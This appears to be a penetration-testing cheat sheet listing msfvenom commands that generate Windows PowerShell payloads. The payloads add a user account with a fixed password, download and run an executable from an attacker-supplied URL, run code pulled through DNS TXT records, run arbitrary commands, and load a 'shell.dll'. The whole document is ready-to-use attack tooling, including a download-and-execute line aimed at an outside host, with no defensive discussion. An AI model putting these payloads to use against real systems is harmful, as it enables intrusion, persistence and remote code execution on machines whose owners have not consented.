# Executable Scripting Payloads

## 01 - Add User

```
$ msfvenom -p cmd/windows/powershell/adduser user=sysadmin pass=Password1234! wmic=[true | false] custom=<group_name> -f raw
```

## 02 - Download and Execute

```
$ msfvenom -p cmd/windows/powershell/download_exec exitfunc=<seh | thread | process | none> exe=<filename>.exe url=http[s]://<IP>/payload.exe
```

## 03 - DNS TXT Query Exec

```
$ msfvenom -p cmd/windows/powershell/dns_txt_query_exec dnszone=<domain.com>
```

## 04 - Execute

1. x86 (32-bit) Payloads

```
$ msfvenom -p cmd/windows/powershell/exec cmd=<commands>

$ msfvenom -p cmd/windows/powershell/loadlibrary dll=C:\\path\\to\\shell.dll exitfunc=<seh | thread | process | none>

$ msfvenom -p cmd/windows/powershell/messagebox icon=<NO | ERROR | INFORMATION | WARNING | QUESTION> text="<text>" title="<title>" exitfunc=<seh | thread | process | none>
```

2. x86-64 (64-bit) Payloads

```
$ msfvenom -p cmd/windows/powershell/x64/exec cmd=<commands>

$ msfvenom -p cmd/windows/powershell/x64/loadlibrary dll=C:\\path\\to\\shell.dll exitfunc=<seh | thread | process | none>

$ msfvenom -p cmd/windows/powershell/x64/messagebox icon=<NO | ERROR | INFORMATION | WARNING | QUESTION> text="<text>" title="<title>" exitfunc=<seh | thread | process | none>
```

## 05 - Text-To-Speech

```
$ msfvenom -p cmd/windows/powershell/speak_pwned
```